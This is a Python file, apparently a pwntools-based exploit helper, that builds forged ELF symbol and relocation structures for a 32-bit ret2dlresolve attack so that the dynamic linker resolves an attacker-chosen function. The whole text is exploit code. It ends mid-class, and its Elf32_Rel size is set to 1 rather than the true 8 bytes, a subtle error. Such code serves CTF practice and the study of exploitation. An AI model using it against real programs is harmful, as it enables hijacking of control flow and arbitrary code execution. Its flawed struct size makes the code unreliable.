from pwn import *
import struct

def get_data_addr(elf):
    bss_section = elf.get_section_by_name(".bss").header.sh_addr
    bss_size = elf.get_section_by_name(".bss").header.sh_size
    addr = bss_section + bss_size
    addr += (-addr & 0xfff) - 0x200 #next page in memory - 0x200
    return addr

class Elf32_Sym(object):
    """
        typedef struct elf32_sym{
            Elf32_Word	st_name;
            Elf32_Addr	st_value;
            Elf32_Word	st_size;
            unsigned char	st_info;
            unsigned char	st_other;
            Elf32_Half	st_shndx;
        } Elf32_Sym;
    """
    size = 16
    def __init__(self, st_name=0, st_value=0, st_size=0, st_info=0, st_other=0, st_shndx=0):
        self.st_name = st_name
        self.st_value = st_value
        self.st_size = st_size
        self.st_info = st_info
        self.st_other = st_other
        self.st_shndx = st_shndx

class Elf32_Rel(object):
    """
        typedef struct elf32_rel {
            Elf32_Addr  r_offset;
            Elf32_Word  r_info;
        } Elf32_Rel;
    """
    size=1
    def __init__(self, r_offset=0, r_info=0):
        self.r_offset = r_offset
        self.r_info = r_info

def align(alignment, x):
    """align(alignment, x) -> int
    Rounds `x` up to nearest multiple of the `alignment`.
    Example:
      >>> [align(5, n) for n in range(15)]
      [0, 5, 5, 5, 5, 5, 10, 10, 10, 10, 10, 15, 15, 15, 15]
    """
    return x + -x % alignment

class dlresolve_paydata:
    def __init__(self, symbol, SYMTAB, STRTAB, JMPREL, DATA_ADDR):
        self.SYMTAB = SYMTAB
        self.STRTAB = STRTAB
        self.JMPREL = JMPREL
        self.DATA_ADDR = DATA_ADDR

        self.symbol = symbol
        self.symbol_name_addr = DATA_ADDR + 0 # where the symbol will be stored
        self.symbol_name = self.symbol.encode() + b"\x00" # full symbol with a null byte
        self.symbol_end_addr = self.symbol_name_addr + len(self.symbol_name) # after the address of the symbol
        # ELFSYM
        self.index = align(Elf32_Sym.size, self.symbol_end_addr - SYMTAB) // Elf32_Sym.size
        self.sym_addr = SYMTAB + Elf32_Sym.size * self.index
        self.sym_struct = Elf32_Sym(st_name=self.symbol_name_addr - STRTAB)
        self.sym_end_addr = self.sym_addr + self.sym_struct.size
        self.reloc_index = align(Elf32_Rel.size, self.sym_end_addr - JMPREL) // Elf32_Rel.size
        # ELFREL
        self.rel_addr = JMPREL + self.reloc_index * Elf32_Rel.size
        self.rel_type = 7
        self.rel_struct = Elf32_Rel(r_offset=DATA_ADDR, r_info=(self.index << 8) + self.rel_type)
